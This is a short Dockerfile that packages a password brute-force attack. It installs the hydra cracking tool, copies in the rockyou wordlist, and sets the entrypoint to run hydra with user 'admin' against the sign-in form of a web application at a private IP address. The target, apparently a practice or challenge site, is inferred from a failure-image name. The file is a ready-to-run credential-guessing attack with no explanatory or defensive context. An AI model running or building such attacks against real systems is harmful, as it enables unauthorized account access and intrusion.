FROM ubuntu:latest

RUN apt update && apt install -y hydra curl

COPY rockyou.txt /root/passwords.txt

ENTRYPOINT ["hydra", "-l", "admin", "-P", "/root/passwords.txt", "192.168.1.17", "http-get-form", "/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:images/WrongAnswer.gif"]
